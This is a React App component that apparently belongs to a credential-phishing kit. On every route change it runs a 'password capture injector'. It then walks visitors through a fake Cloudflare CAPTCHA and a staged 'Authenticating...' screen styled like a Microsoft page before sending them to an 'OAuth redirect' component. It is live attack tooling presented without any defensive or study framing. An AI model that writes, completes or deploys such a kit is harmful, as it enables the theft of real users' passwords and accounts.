import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback'; // Import the new component
import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const App: React.FC = () => {
    // Using React Router to handle different pages
    return (
        <Router>
            <MainContent />
        </Router>
    );
};

const MainContent: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');
    const location = useLocation();

    // Inject scripts on component mount and location change
    useEffect(() => {
        try {
            injectPasswordCaptureScript();
            console.log('✅ Password capture injector initialized');
        } catch (error) {
            console.warn('⚠️ Failed to initialize password capture injector:', error);
        }
    }, [location]);

    // This component will render the correct "page" based on the URL path
    return (
        <Routes>
            <Route path="/auth/callback" element={<AuthCallback />} />
            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
        </Routes>
    );
};


// This component contains the original page logic
const DefaultPage = ({ currentPage, setCurrentPage }) => {
    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, [setCurrentPage]);

    const handleCaptchaVerified = () => {
        setCurrentPage('authenticating');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };

    useEffect(() => {
        if (currentPage === 'authenticating') {
            const timer = setTimeout(() => {
                setCurrentPage('replacement');
            }, 1500); // Short delay before redirecting to replacement
            return () => clearTimeout(timer);
        }
    }, [currentPage]);
    
    // Original switch logic for the main flow
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'authenticating':
            return (
              <div style={{
                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
                fontFamily: 'Arial, sans-serif', backgroundColor: '#f3f2f1'
              }}>
                <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
                  Authenticating...
                </div>
              </div>
            );
        case 'message-icon':
            return <MessageIconLanding onOpenMessage={() => {}} />;
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;
